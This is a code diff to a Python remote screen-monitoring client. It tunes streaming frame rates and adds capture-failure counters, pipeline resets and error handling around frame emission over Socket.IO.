@@ -284,8 +284,8 @@ CONFIG = {
     "RECONNECT_MAX":        60,
 
     # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
-    "STREAM_FPS":           30,         # target FPS — 30Hz is stable for relay
-    "STREAM_MIN_FPS":       10,         # ENTERPRISE: floor raised — 5fps caused apparent freezes
+    "STREAM_FPS":           20,         # target FPS
+    "STREAM_MIN_FPS":       2,          # drop to 2fps on static screens
     "STREAM_QUALITY":       75,         # JPEG quality
     "STREAM_MONITOR":       1,
     "STREAM_MODE":          "video",    # "video" or "screenshot"
@@ -671,11 +671,13 @@ class AdaptiveFPS:
 
     def report(self, changed):
         if changed:
-            self._idle = 0; self._cur = self.max_fps
+            self._idle = 0
+            self._cur = self.max_fps
         else:
             self._idle += 1
-            if self._idle > 600:  # FIX: wait 10s before dropping (was 5s)
-                self._cur = max(self.min_fps, 2)  # FIX: never below 2fps
+            # ENTERPRISE: drop FPS faster on static screens to save bandwidth
+            if self._idle > 30:  # 1 second at 30fps
+                self._cur = max(self.min_fps, 2)
 
     @property
     def fps(self): return self._cur
@@ -904,6 +906,7 @@ async def _adv_task_stream_frames():
     
     loop    = asyncio.get_event_loop()
     n = 0
+    grab_fails = 0
     cfg_sig = _current_stream_config()
 
     try:
@@ -911,15 +914,11 @@ async def _adv_task_stream_frames():
             t0 = time.monotonic()
             if not _adv_authed:
                 await asyncio.sleep(0.1); continue
-            # FIX: viewer_count race — stream for up to 60s after auth even if count=0
-            # because viewer_count may arrive AFTER the stream loop starts.
-            # After 60s with no viewer we pause to save bandwidth.
-            # ENTERPRISE: stream continuously — server only fans out to actual viewers
-            # Never gate on _adv_viewers; viewer_count events are race-prone
-            pass
 
             next_sig = _current_stream_config()
-            if next_sig != cfg_sig:
+            if next_sig != cfg_sig or grab_fails > 10:
+                if grab_fails > 10:
+                    log.warning("Advanced Monitor: too many capture failures — resetting pipeline")
                 try:
                     capture.close()
                 except Exception:
@@ -929,21 +928,27 @@ async def _adv_task_stream_frames():
                     h, w = frame.shape[:2] # Update dimensions
                     cfg_sig = next_sig
                     n = 0
+                    grab_fails = 0
                 except Exception as e:
                     log.warning(f"Advanced Monitor reconfigure failed: {e}")
                     await asyncio.sleep(1)
                     continue
 
-            raw = frame if frame is not None else capture.grab()
-            frame = None
-            if raw is None:
+            try:
+                raw = frame if frame is not None else capture.grab()
+                frame = None
+                if raw is None:
+                    grab_fails += 1
+                    await asyncio.sleep(max(0.01, fps_ctl.interval)); continue
+                grab_fails = 0
+            except Exception as e:
+                log.debug(f"Capture grab error: {e}")
+                grab_fails += 1
                 await asyncio.sleep(max(0.01, fps_ctl.interval)); continue
 
             # ENTERPRISE: always encode + send every frame at fps_ctl rate
-            # FrameDiffer throttling caused apparent stream freezes on static desktops
             changed = differ.changed(raw)
             fps_ctl.report(changed)
-            # Never skip — AdaptiveFPS interval controls bandwidth, not frame dropping
 
             force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)
             
@@ -965,8 +970,13 @@ async def _adv_task_stream_frames():
             _adv_last_frame_pkt = pkt
             _adv_last_frame_ts = time.monotonic()
 
-            # Emit frame — non-blocking
-            await _adv_sio_async.emit("frame_bin", pkt)
+            # Emit frame — wrap in try/except to prevent task crash
+            try:
+                if _adv_sio_async and _adv_sio_async.connected:
+                    await _adv_sio_async.emit("frame_bin", pkt)
+            except Exception as e:
+                log.debug(f"Socket emit error: {e}")
+
             n += 1
 
             # Also push over any open WebRTC DataChannels
@@ -1275,6 +1285,7 @@ def _start_screenshot_fallback(sio_client):
         cap = None
         cfg_sig = None
         n = 0
+        grab_fails = 0
         while not _fb_stop.is_set():
             try:
                 # ENTERPRISE: only stop fallback when adv socket sustains < 0.5s between frames
@@ -1284,21 +1295,28 @@ def _start_screenshot_fallback(sio_client):
                 ):
                     log.info("Screenshot fallback: adv socket sustaining stream — stopping fallback")
                     break
-                # ENTERPRISE: removed _adv_viewers gate — request_action proves viewer is present
+
                 next_sig = _current_stream_config()
-                if next_sig != cfg_sig or cap is None:
+                if next_sig != cfg_sig or cap is None or grab_fails > 10:
+                    if grab_fails > 10:
+                        log.warning("Screenshot fallback: too many capture failures — resetting")
                     if cap:
                         try: cap.close()
                         except Exception: pass
                     fps = next_sig[1]
                     quality = next_sig[2]
-                    interval = 1.0 / max(1, min(fps, 30))  # FIX: raised cap to 30fps
+                    interval = 1.0 / max(1, min(fps, 30))
                     cap = _make_capture()
                     cfg_sig = next_sig
+                    grab_fails = 0
                     log.info(f"Screenshot fallback: reconfigured monitor={next_sig[0]} fps={fps} quality={quality}")
+
                 frame = cap.grab()
                 if frame is None:
+                    grab_fails += 1
                     time.sleep(interval); continue
+                grab_fails = 0
+
                 h, w = frame.shape[:2]
                 # FIX: PIL fallback when cv2 not available in compiled exe
                 if CV2_OK:
@@ -1321,21 +1339,24 @@ def _start_screenshot_fallback(sio_client):
                 header  = FRAME_HDR.pack(w, h, ts_us, FLAG_JPEG, len(payload))
                 pkt     = header + payload
                 if sio_client and sio_client.connected:
-                    b64_frame = base64.b64encode(payload).decode()
-                    b64_pkt   = base64.b64encode(pkt).decode()
-                    sio_client.emit("screenshot_result", {
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "frame":     b64_frame,
-                        "image":     b64_frame,
-                        "w": w, "h": h,
-                        "_raw_bin":  False,
-                    })
-                    # FIX: send only b64 (no list key) — list(pkt) for a 200KB frame
-                    # allocates 200K Python int objects and is extremely slow
-                    sio_client.emit("frame_bin_relay", {
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "b64": b64_pkt,
-                    })
+                    try:
+                        b64_frame = base64.b64encode(payload).decode()
+                        b64_pkt   = base64.b64encode(pkt).decode()
+                        sio_client.emit("screenshot_result", {
+                            "device_id": CONFIG["DEVICE_TOKEN"],
+                            "frame":     b64_frame,
+                            "image":     b64_frame,
+                            "w": w, "h": h,
+                            "_raw_bin":  False,
+                        })
+                        # FIX: send only b64 (no list key) — list(pkt) for a 200KB frame
+                        # allocates 200K Python int objects and is extremely slow
+                        sio_client.emit("frame_bin_relay", {
+                            "device_id": CONFIG["DEVICE_TOKEN"],
+                            "b64": b64_pkt,
+                        })
+                    except Exception as e:
+                        log.debug(f"Screenshot fallback emit error: {e}")
                 n += 1
                 time.sleep(interval)
             except Exception as e:
